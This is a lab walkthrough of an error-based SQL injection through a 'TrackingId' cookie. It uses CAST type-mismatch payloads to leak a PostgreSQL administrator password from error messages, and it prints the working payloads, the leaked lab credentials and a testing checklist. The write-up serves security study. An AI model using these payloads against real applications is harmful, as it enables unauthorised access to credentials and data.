## 🎯 Objective

Exploit a **visible error-based SQL injection** vulnerability to extract the **administrator password** by abusing **database error messages**, and use the leaked credentials to solve the lab.

---

## 🧩 1. Initial Testing & Vulnerability Identification

### Parameters Tested

- `productId`

The parameter was tested with a single quote (`'`) and **no abnormal behavior** was observed.

### Cookie-Based Testing

While inspecting the HTTP request, a custom cookie parameter named **`TrackingId`** was identified.

### Observation

- Normal `TrackingId` → Application behaves normally
- Adding a single quote (`'`) → **500 Internal Server Error**

### Error Message Observed

```sql
Unterminatedstring literal started at position52in SQL
SELECT *FROM trackingWHERE id ='cxo6JUMVbyuRDwl0''.
Expectedchar
```

This behavior indicates:

- User input is directly embedded into a SQL query
- SQL errors are **not suppressed**
- The backend reveals query structure and parsing failures

This confirms a **visible error-based SQL injection vulnerability**.

---

## 🧠 2. Understanding Why This Is Error-Based SQL Injection

In this lab:

- SQL errors are displayed to the user
- Database parsing and type errors are reflected in responses
- Attacker-controlled input appears inside error messages

This means:

- We do **not** need blind boolean inference
- We can directly extract data via **type mismatch and casting errors**
- Error messages themselves act as the data leakage channel

The application likely executes a query similar to:

```sql
SELECT*FROM tracking
WHERE id='<TrackingId>';
```

---

## 🧪 3. Confirming Injection Control via Errors

To confirm control over the SQL query, a payload was crafted that forces the database to evaluate an injected expression.

### Payload Used

```sql
TrackingId=' AND 1=cast((select 1) as int) --
```

### Result

- The payload is evaluated by the database
- SQL processing continues past the injected logic
- Confirms attacker-controlled SQL execution

This proves the injection is exploitable using **error-based techniques**.

---

## ❌ 4. Why UNION Is Not Required Here

### ❌ Unnecessary Technique

```sql
UNION SELECT username, password FROM users--
```

**Why this is unnecessary:**

- Query output is **not rendered into the page**
- However, **database errors are fully visible**
- Error-based SQLi allows direct data leakage without UNION

**Lesson:**

When database errors are visible, **error-based extraction is faster and simpler** than UNION or blind techniques.

---

## 🧠 5. Why Some Payloads Failed

Understanding why payloads fail is critical to crafting correct error-based attacks.

---

### ❌ Failed Payload — Invalid SQL Syntax

```sql
TrackingId=' AND 1=(select username in the users Limit 1) --

```

**Why it fails:**

- Invalid SQL syntax (`IN THE users`)
- Query parsing fails before meaningful evaluation
- Results in a generic syntax error

**Correct mindset:**

Error-based SQLi still requires **valid SQL syntax** to reach exploitable execution paths.

---

## ✅ 6. Why Casting Payloads Worked

### Working Payload Example

```sql
TrackingId=' AND 1=cast((select username from users LIMIT 1) as int) --
```

### Explanation

- `username` is a string value
- Casting it to `int` forces a **type mismatch**
- PostgreSQL includes the offending value in the error message

This confirms the first user is **administrator**.

---

## 🔎 7. SQL Functions Used (Core Concepts)

This lab relies on **type casting and error propagation**, not boolean inference.

---

### 1️⃣ `CAST()`

### Syntax

```sql
CAST(expression AS datatype)
```

### Purpose

- Forces type conversion
- Triggers errors when conversion is invalid
- Leaks data via error messages

---

### 2️⃣ `LIMIT`

### Syntax

```sql
LIMIT 1
```

### Purpose

- Ensures subqueries return **exactly one row**
- Prevents multi-row subquery errors
- Required for controlled error-based extraction

---

**Key Rule:**

> In error-based SQL injection, payloads must be syntactically valid and force the database to include sensitive values inside error messages.
> 

---

## 🧪 8. Password Extraction via Error Messages

### Payload Used

```sql
TrackingId=' AND 1=cast((select password from users LIMIT 1) as int) --
```

### Error Message Returned

```sql
ERROR: invalid input syntaxfortypeinteger: "59lftb5j38xy4t8vcyim"
```

### Result

- The administrator password is leaked **directly in the error message**
- No brute force or automation required

---

## 📊 9. Final Result

```
Username: administrator
Password: 59lftb5j38xy4t8vcyim
```

- Logged in successfully
- Lab completion animation displayed
- Lab marked as solved
- Screenshot:
-   <img width="1293" height="260" alt="image" src="https://github.com/user-attachments/assets/362b7c6c-4bc6-42c8-ad53-bced1d294ae3" />


---

## 🔮 10. Future Testing Notes (Important)

### When Testing SQL Injection:

1. Test **all inputs**:
    - URL parameters
    - POST data
    - Cookies
    - Headers
2. Observe **error behavior early**
3. Decide attack type:
    - Errors visible → Error-based SQLi
    - No errors/output → Blind SQLi
4. Error-based workflow:
    - Trigger syntax error
    - Identify DBMS
    - Use casting/type mismatches
    - Constrain subqueries with `LIMIT 1`
5. Common mistakes to avoid:
    - Invalid SQL syntax
    - Multi-row subqueries
    - Assuming character limits instead of syntax issues

---

## 🧭 11. Notes for My Future Self

- Visible SQL errors are high-impact vulnerabilities
- Error messages often leak full credentials
- Casting strings to integers is a powerful extraction technique
- Cookies are common SQLi injection points
- Always exploit error-based SQLi before switching to blind methods
